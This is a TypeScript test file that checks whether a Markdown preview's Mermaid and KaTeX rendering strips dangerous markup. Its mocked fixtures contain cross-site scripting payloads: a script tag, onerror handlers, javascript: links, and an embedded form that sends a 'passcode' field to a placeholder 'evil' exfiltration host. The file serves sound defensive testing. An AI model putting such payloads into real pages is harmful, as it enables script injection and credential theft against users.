import { afterEach, describe, expect, it, vi } from 'vitest'

const MERMAID_FIXTURE = [
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 50">',
  '<style>#c1 .node rect{fill:red}</style>',
  '<defs><marker id="ar" refX="4" refY="2" markerWidth="6" markerHeight="6"><path d="M0 0L4 4"></path></marker></defs>',
  '<g class="node"><rect rx="3" width="80" height="20"></rect>',
  '<foreignObject width="80" height="20"><div xmlns="http://www.w3.org/1999/xhtml" class="label"><span>hello</span><br/></div></foreignObject></g>',
  '<use href="#ar" xlink:href="#ar"></use>',
  '<script>alert(1)</script>',
  '<path d="M1 1" onerror="alert(2)"></path>',
  '<a xlink:href="javascript:alert(3)"><text>x</text></a>',
  '<foreignObject width="80" height="20"><form action="https://evil/submit"><input name="passcode"><button formaction="https://evil/exfil">go</button></form></foreignObject>',
  '<image href="ok.png" onerror="alert(4)"></image>',
  '</svg>',
].join('')

vi.mock('mermaid', () => ({
  default: {
    initialize: vi.fn(),
    render: vi.fn(async () => ({ svg: MERMAID_FIXTURE })),
  },
}))

vi.mock('../katex-loader', () => ({
  default: {
    renderToString: () => [
      '<span class="katex"><span class="mord" style="color:red">x</span>',
      '<img src="x" onerror="alert(4)"><a href="javascript:alert(5)">y</a></span>',
    ].join(''),
  },
}))

afterEach(() => {
  document.body.replaceChildren()
})

async function renderDiagram(source: string): Promise<HTMLElement> {
  const { renderPendingMermaid } = await import('./enhance')
  const root = document.createElement('div')
  const node = document.createElement('div')
  node.dataset.mermaid = source
  root.append(node)
  document.body.append(root)
  await renderPendingMermaid(root, false)
  return node
}

describe('mermaid output', () => {
  it('strips executable payloads from renderer output before injection', async () => {
    const node = await renderDiagram('graph TD;A-->B;')
    const html = node.innerHTML
    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('javascript:')
  })

  it('preserves the diagram structure mermaid needs to display', async () => {
    const html = (await renderDiagram('graph LR;X-->Y;')).innerHTML
    expect(html).toContain('fill:red')
    expect(html).toContain('marker')
    expect(html).toContain('class="label"')
    expect(html).toContain('hello')
    expect(html).toContain('#ar')
  })

  // The second pass used to swap the shared config for its own, which re-allowed the
  // form controls and attributes the renderer deliberately forbids.
  it('keeps the shared forbidden lists in force for the second pass', async () => {
    const html = (await renderDiagram('graph TD;Q-->R;')).innerHTML
    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
    expect(html).not.toContain('formaction')
    expect(html).not.toContain('https://evil')
    expect(html).toContain('foreignObject')
  })
})

describe('katex output', () => {
  it('strips executable payloads from math renderer output', async () => {
    const { enhancePreview } = await import('./enhance')
    const root = document.createElement('div')
    const node = document.createElement('span')
    node.dataset.math = '\\alpha'
    root.append(node)
    document.body.append(root)
    await enhancePreview(root, { math: true, mermaid: false, chart: false, dark: false })
    expect(node.innerHTML).toContain('katex')
    expect(node.innerHTML).not.toContain('onerror')
    expect(node.innerHTML).not.toContain('alert(')
    expect(node.innerHTML).toContain('color:red')
  })
})
